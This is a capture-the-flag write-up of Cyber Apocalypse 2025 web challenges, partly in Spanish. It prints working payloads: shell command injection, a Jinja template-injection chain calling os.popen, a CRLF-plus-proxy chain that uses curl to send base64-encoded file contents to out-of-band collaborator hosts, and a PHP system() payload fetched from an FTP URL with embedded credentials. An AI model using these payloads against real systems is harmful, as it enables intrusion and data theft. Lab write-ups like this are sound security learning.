---
title: Cyber Apocalypse 2025 - 6x Web Challenges Writeup
date: 2025-03-25 08:00:00 -0500
image: 
 path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image.png
 height: 1400
 width: 700
categories: [HTB Writeups, Cyber Apocalypse CTF]
tags: [Writeup, CTF, Web]
---

I participated as a member of team **CibersecUNI**. This time i managed to solve all 6/6 challenges in the web category.

Web
- [Whispers of the Moonbeam](#Whispers-of-the-Moonbeam)
- [Trial by Fire](#Trial-by-Fire)
- [Cyber Attack](#Cyber-Attack)
- [Eldoria Panel](#Eldoria-Panel)

# Whispers of the Moonbeam

- 🐳 _Instancer_ 1 IP (web ui)

![alt text](image.png)

ovserving the functions, at the bottom it indicates use ; to `inject commands`.

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-1.png)

Using the command gossip, I can list the files, and with a simple ; I can read the flag

```bash
gossip; cat flag.txt
```
Get the flag. 🎉
HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_78cb9b70be3bf077e608865b967b5ab1}

this was very straightforward challenge.

# Trial by Fire

- 🐳 _Instancer_ 1 IP (web ui)
- 📦 [web_trial_by_fire.zip](https://github.com/s4yhii/s4yhii.github.io/raw/master/assets/zip/web_trial_by_fire.zip)

Looking at the ui, this might be exploitable to ssti

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-2.png)

```python
@web.route('/begin', methods=['POST'])
def begin_journey():
    warrior_name = request.form.get('warrior_name', '').strip()
    if not warrior_name:
        return redirect(url_for('web.index'))

    session['warrior_name'] = warrior_name
    return render_template('intro.html', warrior_name=warrior_name)

@web.route('/flamedrake')
def flamedrake():
    warrior_name = session.get('warrior_name')
    if not warrior_name:
        return redirect(url_for('web.index'))
    return render_template("flamedrake.html", warrior_name=warrior_name)

@web.route('/battle-report', methods=['POST'])
def battle_report():
    warrior_name = session.get("warrior_name", "Unknown Warrior")
    battle_duration = request.form.get('battle_duration', "0")

    stats = {
        'damage_dealt': request.form.get('damage_dealt', "0"),
        'damage_taken': request.form.get('damage_taken', "0"),
        'spells_cast': request.form.get('spells_cast', "0"),
        'turns_survived': request.form.get('turns_survived', "0"),
        'outcome': request.form.get('outcome', 'defeat')
    }
```
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-9.png)

The template is the following, so we should hit the endpoint /battle-report in order to get our ssti payload work.
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-10.png)

```html
<div class="warrior-info">
    <i class="nes-icon is-large heart"></i>
    <p class="nes-text is-primary warrior-name">{warrior_name}</p>
</div>
```
![a](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-3.png)

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-11.png)

After verifying that our string payload 7*7 is renderized as 49 in the response, we should inject our final payload to read the flag.

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-5.png)
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-12.png)

{% raw %}
```liquid
warrior_name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20flag.txt').read()}}
```
{% endraw %}

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-6.png)

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-13.png)
Get the flag. 🎉
HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_9c285b69f155f1d253dfefe5fe30667d}


# Cyber Attack

Este reto tiene varios pasos, pero en general se abusará de CRLF Injection + Proxy + RCE

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-14.png)

Se observa un panel con 2 campos, name y domain, solo se puede usar el boton de Attack a Domain, ya que el boton de Attack an IP solo se puede realizar desde localhost. Gracias a esta porción de código en el index.php

```js
// Check if the user's IP is local
const isLocalIP = (ip) => {
    return ip === "127.0.0.1" || ip === "::1" || ip.startsWith("192.168.");
};

// Get the user's IP address
const userIP = "<?php echo $_SERVER['REMOTE_ADDR']; ?>";

// Enable/disable the "Attack IP" button based on the user's IP
const attackIPButton = document.getElementById("attack-ip");
```

attack-domain file:

```js
def is_domain(target):
    return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')
if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
    
elif is_domain(target):
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {target}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
else:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()
```

Se observa que imprime Location: y Content-Type, pero no valida que name no incluya \r\n, lo que permite inyectar nuevas cabeceras HTTP, adicionalmente en el archivo Dockerfile se habilita el módulo proxy para Apache, el cual permite enviar peticiones a servicios http.

```docker
RUN a2enmod rewrite cgi proxy proxy_fcgi proxy_http
```

Ejemplo, si envío `name=a%0d%0aLocation: /a%0d%0aContent-Type: proxy:...`, se transforma en la siguiente respuesta.

```http
HTTP/1.1 302 Found
Location: /a
Content-Type: proxy:http://127.0.0.1/cgi-bin/attack-ip?target=...
```

Ahora que ya encontramos la forma de hacer solicitudes internas es hora de abusar del endpoint /attack-ip, el cual tiene como código.

```python
#!/usr/bin/env python3

import cgi
import os
from ipaddress import ip_address

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')

if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')

try:
    count = 1  # Increase this for an actual attack
    os.popen(f'ping -c {count} {ip_address(target)}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
except:
    print(f'Location: ../?error=Hey {name}, watch it!')

print('Content-Type: text/html')
print()
```

Se observa que se intenta validar target con ip_address() de la librería ipaddress de Python, para asegurarse de que sea una IP válida, podemos inyectar comandos usando $, ya que Apache está ejecutando el CGI, entonces la inyección se da antes siquiera de que se llegue al código Python. Solo basta con proporcionar una IP valida, ya sea ipv4 o ipv6.

Usaremos en este caso una ipv6 y el caracter especial $ para ejecutar comandos:

```bash
::1%$(command)
```
Nuestro payload completo se traduce a:

```js
GET /cgi-bin/attack-domain?target=-&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%25%32%30aqsmhrfmvylkqdnuqyqqpqvhktneu42h2.oast.fun?testt)%260name=%0D%0A%0D%0A
```

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-15.png)

El cual hace una simple petición a mi webhook para validar si funciona.

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-16.png)

Se observa que si funciona, otro incoveniente ahora es que no se puede usar / en el comando, entonces para listar y navegar por directorios tuve que usar un poco de ingenio.

En vez de realizar 

```bash
cd ../../../ | base64 -w0
```
Tuve que realizar el siguiente, dado que este comando no tiene el caracter '/' y no rompe la sintaxis de una url.

```bash
echo 'cd ..;cd ..;cd ..; ls'|sh| base64 -w0
```

![listfiles](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-8.png)

```bash 
echo 'cd ..;cd ..;cd ..; cat flag-jqpeei2a5jk8hr8.txt'|sh| base64 -w0
```

Como payload final para leer la flag usé Burp Collaborator para decodear a la vez de base64.

```js
GET /cgi-bin/attack-domain?target=-&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%25%32%30cfvekttb0yhbc2ia84d9zkasqjwak68v.oastify.com?p=$(echo%25%32%30%27cd%25%32%30..%25%33%62cd%25%32%30..%25%33%62cd%25%32%30..%25%33%62%25%32%30cat%25%32%30*.txt%27|sh|%25%32%30base64%25%32%30-w0))%260name=%0D%0A%0D%0A 
```

![Collabflag](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-7.png)

Get the flag. 🎉
HTB{h4ndl1n6_m4l4k4r5_f0rc35}

# Eldoria Panel

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-20.png)

Nos encontramos con este panel, existe una funcionalidad de "claim guest"

https://sftpcloud.io/tools/free-ftp-server

FTP upload
![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-21.png)


![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-17.png)

```php
<?php
system("ls -la /flag*");
system("cat /flag*");
?>
```

```json
{
  "template_path": "ftp://da192e7de042469196ddc45e20c9eb88:i2rMACU1fteQbrIEqh3zAqdNezrtTpKH@eu-central-1.sftpcloud.io"
}
```
![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-18.png)

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-19.png)
Get the flag. 🎉

HTB{p41n_c4us3d_by_th3_usu4l_5u5p3ct_5f8e78373f521bac3069c1e39d487581}


# Eldoria Realms

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-22.png)

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-24.png)

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-25.png)

![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-23.png)

HTB{p0llut3_4nd_h1t_pr0toc0lz_w_4_sw1tch_d730bc90109dcd38663a32b93f3ac999}